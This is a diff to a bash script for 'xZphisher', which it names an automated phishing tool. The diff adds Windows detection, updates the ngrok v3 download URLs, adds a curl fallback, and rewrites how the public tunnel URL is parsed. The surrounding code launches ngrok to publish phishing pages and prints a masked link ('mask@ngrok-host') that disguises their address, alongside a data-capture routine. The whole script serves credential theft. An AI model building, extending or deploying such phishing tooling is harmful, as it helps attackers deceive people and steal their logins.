@@ -2,7 +2,7 @@
 
 ##   xZphisher 	: 	Automated Phishing Tool
 ##   Author 	: 	Rishabh Anand
-##   Version 	: 	Mark-1
+##   Version 	: 	Mark-III
 ##   Github 	: 	https://github.com/TheFenrisLycaon
 
 ##   THANKS TO :
@@ -69,6 +69,9 @@ kill_pid() {
 	if [[ $(pidof ngrok) ]]; then
 		killall ngrok >/dev/null 2>&1
 	fi
+	if [[ $(pidof ngrok.exe) ]]; then
+		killall ngrok.exe >/dev/null 2>&1
+	fi
 }
 
 ## Small Banner
@@ -82,7 +85,7 @@ banner() {
 		${BLUE}  d8b Y8b  d8P d88 888 88"  888 888 888 d,dP  888 888 
 		${BLUE}                   888 
 		${BLUE}                   888 ${WHITE} by TheFenrisLycaon                            
-		${BLUE}                   888 ${WHITE} Mark-II
+		${BLUE}                   888 ${WHITE} Mark-III
 		${BLUE}  
 	EOF
 }
@@ -129,6 +132,17 @@ dependencies() {
 	fi
 }
 
+## Detect OS and set ngrok binary name
+detect_os() {
+	if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "cygwin" || -n "$MSYSTEM" ]]; then
+		OS="windows"
+		NGROK_BIN="ngrok.exe"
+	else
+		OS="linux"
+		NGROK_BIN="ngrok"
+	fi
+}
+
 ## Download Ngrok
 download_ngrok() {
 	url="$1"
@@ -136,12 +150,12 @@ download_ngrok() {
 	if [[ -e "$file" ]]; then
 		rm -rf "$file"
 	fi
-	wget --no-check-certificate "$url" >/dev/null 2>&1
+	wget --no-check-certificate "$url" >/dev/null 2>&1 || curl -sL "$url" -o "$file" >/dev/null 2>&1
 	if [[ -e "$file" ]]; then
 		unzip "$file" >/dev/null 2>&1
-		mv -f ngrok .server/ngrok >/dev/null 2>&1
+		mv -f $NGROK_BIN .server/$NGROK_BIN >/dev/null 2>&1
 		rm -rf "$file" >/dev/null 2>&1
-		chmod +x .server/ngrok >/dev/null 2>&1
+		chmod +x .server/$NGROK_BIN >/dev/null 2>&1
 	else
 		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
 		{
@@ -153,19 +167,24 @@ download_ngrok() {
 
 ## Install ngrok
 install_ngrok() {
-	if [[ -e ".server/ngrok" ]]; then
+	detect_os
+	if [[ -e ".server/$NGROK_BIN" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
 	else
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
-		arch=$(uname -m)
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
-		elif [[ "$arch" == *'aarch64'* ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
-		elif [[ "$arch" == *'x86_64'* ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
+		if [[ "$OS" == "windows" ]]; then
+			download_ngrok 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip'
 		else
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
+			arch=$(uname -m)
+			if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+				download_ngrok 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip'
+			elif [[ "$arch" == *'aarch64'* ]]; then
+				download_ngrok 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip'
+			elif [[ "$arch" == *'x86_64'* ]]; then
+				download_ngrok 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip'
+			else
+				download_ngrok 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip'
+			fi
 		fi
 	fi
 
@@ -195,7 +214,7 @@ about() {
 	cat <<-EOF
 		${GREEN}Author   ${RED}:  ${ORANGE}Fenris Lycaon ${RED}[ ${ORANGE}HTR-TECH ${RED}]
 		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/TheFenrisLycaon
-		${GREEN}Version  ${RED}:  ${ORANGE}Mark-I
+		${GREEN}Version  ${RED}:  ${ORANGE}Mark-III
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
@@ -273,6 +292,7 @@ capture_data() {
 
 ## Start ngrok
 start_ngrok() {
+	detect_os
 	{
 		clear
 		banner
@@ -285,9 +305,9 @@ start_ngrok() {
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
 
 	if [[ $(command -v termux-chroot) ]]; then
-		sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" >/dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
+		sleep 2 && termux-chroot ./.server/$NGROK_BIN http "$HOST":"$PORT" >/dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
 	else
-		sleep 2 && ./.server/ngrok http "$HOST":"$PORT" >/dev/null 2>&1 &
+		sleep 2 && ./.server/$NGROK_BIN http "$HOST":"$PORT" >/dev/null 2>&1 &
 	fi
 
 	{
@@ -295,7 +315,7 @@ start_ngrok() {
 		clear
 		banner
 	}
-	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+	ngrok_url=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"https://[^"]*' | grep -o 'https://[^"]*' | head -1)
 	ngrok_url1=${ngrok_url#https://}
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
@@ -613,6 +633,7 @@ main_menu() {
 }
 
 ## Main
+detect_os
 kill_pid
 dependencies
 install_ngrok
